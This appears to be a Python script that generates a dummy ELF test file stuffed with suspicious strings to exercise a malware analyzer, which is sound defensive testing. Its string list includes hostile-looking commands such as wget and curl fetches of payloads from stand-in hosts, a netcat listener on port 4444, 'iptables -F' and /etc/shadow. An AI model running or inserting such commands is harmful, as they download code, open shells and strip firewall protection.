#!/usr/bin/env python3
"""
This script creates a simple test ELF file that contains suspicious strings
to test the malware analyzer on Linux systems.
"""

import os
import sys
import struct
from pathlib import Path

def create_linux_test_sample(output_path: str = "test_linux_sample") -> None:
    """Create a test ELF file with suspicious strings.
    
    Args:
        output_path (str, optional): Output path for the test file. Defaults to "test_linux_sample".
    """
    print(f"Creating Linux test sample at: {output_path}")
    
    # Create a minimal ELF file structure
    # ELF header (64 bytes for 32-bit ELF)
    elf_header = bytearray(64)
    
    # Magic number
    elf_header[0:4] = b'\x7fELF'
    
    # ELF class (1 = 32-bit)
    elf_header[4] = 1
    
    # Data encoding (1 = little endian)
    elf_header[5] = 1
    
    # ELF version
    elf_header[6] = 1
    
    # OS ABI (3 = Linux)
    elf_header[7] = 3
    
    # Machine type (3 = x86)
    elf_header[18:20] = struct.pack('<H', 3)
    
    # Entry point
    elf_header[24:28] = struct.pack('<I', 0x8048000)
    
    # Program header offset
    elf_header[28:32] = struct.pack('<I', 52)
    
    # Section header offset
    elf_header[32:36] = struct.pack('<I', 0x1000)
    
    # Number of program headers
    elf_header[44:46] = struct.pack('<H', 1)
    
    # Number of section headers
    elf_header[46:48] = struct.pack('<H', 3)
    
    # Section header string table index
    elf_header[50:52] = struct.pack('<H', 2)
    
    # Create program header
    phdr = bytearray(32)
    phdr[0:4] = struct.pack('<I', 1)  # Type: PT_LOAD
    phdr[8:12] = struct.pack('<I', 0x8048000)  # Virtual address
    phdr[16:20] = struct.pack('<I', 0x1000)  # File offset
    phdr[20:24] = struct.pack('<I', 0x1000)  # File size
    phdr[24:28] = struct.pack('<I', 0x1000)  # Memory size
    phdr[28:32] = struct.pack('<I', 5)  # Flags: read + execute
    
    # Add suspicious strings
    suspicious_strings = [
        b"/bin/bash",
        b"system",
        b"execve",
        b"fork",
        b"chmod +x",
        b"wget http://evil.com/malware",
        b"curl -O http://malicious.example.com/payload",
        b"nc -l -p 4444",
        b"reverse shell",
        b"backdoor",
        b"rootkit",
        b"keylogger",
        b"libc.so.6",
        b"libpthread.so.0",
        b"libdl.so.2",
        b"evil@example.com",
        b"192.168.1.100",
        b"malicious.example.com",
        b"/etc/passwd",
        b"/etc/shadow",
        b"/tmp/backdoor",
        b"/var/log/auth.log",
        b"iptables -F",
        b"chkconfig off",
        b"service stop",
        b"crontab -e",
        b"ssh-keygen",
        b"rsa private key",
        b"encrypt files",
        b"ransomware",
        b"bitcoin wallet",
        b"payment required"
    ]
    
    # Create the file content
    content = elf_header + phdr
    
    # Add padding to reach section header offset
    padding_size = 0x1000 - len(content)
    content += b'\x00' * padding_size
    
    # Add the suspicious strings
    for s in suspicious_strings:
        content += s + b'\x00'
    
    # Write the file
    with open(output_path, 'wb') as f:
        f.write(content)
    
    # Make it executable on Unix-like systems
    try:
        os.chmod(output_path, 0o755)
        print(f"Made {output_path} executable")
    except:
        print(f"Could not make {output_path} executable (may need sudo)")
    
    print(f"Linux test sample created successfully.")
    print(f"Run the analyzer with: python main.py {output_path} --all")

if __name__ == "__main__":
    output_path = "test_linux_sample"
    if len(sys.argv) > 1:
        output_path = sys.argv[1]
    
    create_linux_test_sample(output_path) 